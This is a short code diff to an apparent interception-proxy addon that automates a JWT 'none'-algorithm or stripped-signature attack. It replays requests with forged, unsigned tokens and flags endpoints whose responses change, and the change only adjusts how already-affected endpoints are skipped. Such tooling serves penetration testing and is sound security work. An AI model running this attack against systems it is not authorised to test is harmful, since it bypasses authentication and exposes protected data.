@@ -26,7 +26,7 @@ class JWTNoneAlgAttack:
         if flow.request.path.find('socket.io') != -1 or not is_request_in_scope(flow):
             return
         
-        if not hasattr(flow, 'label') and flow.request.path not in self.affected_endpoints:  
+        if not hasattr(flow, 'label'):  
             benchmark_flow = flow.copy()
             benchmark_flow.label = self.BENCHMARK_LABEL
             benchmark_flow.request.headers.pop('Authorization', None)
@@ -51,7 +51,7 @@ class JWTNoneAlgAttack:
             attack_flow.request.headers.pop('Authorization', None)
             attack_flow.request.cookies['token'] = drop_token_signature(get_jwt(flow.request.cookies))
             replay_flow(attack_flow)
-        elif flow.label == self.ATTACK_LABEL:    
+        elif flow.label == self.ATTACK_LABEL and flow.request.path not in self.affected_endpoints:    
             if flow.benchmark_hash != hash(flow.response.text):
                 self.affected_endpoints.add(flow.request.path)
                 print_attack_success(self.ATTACK_LABEL, flow)
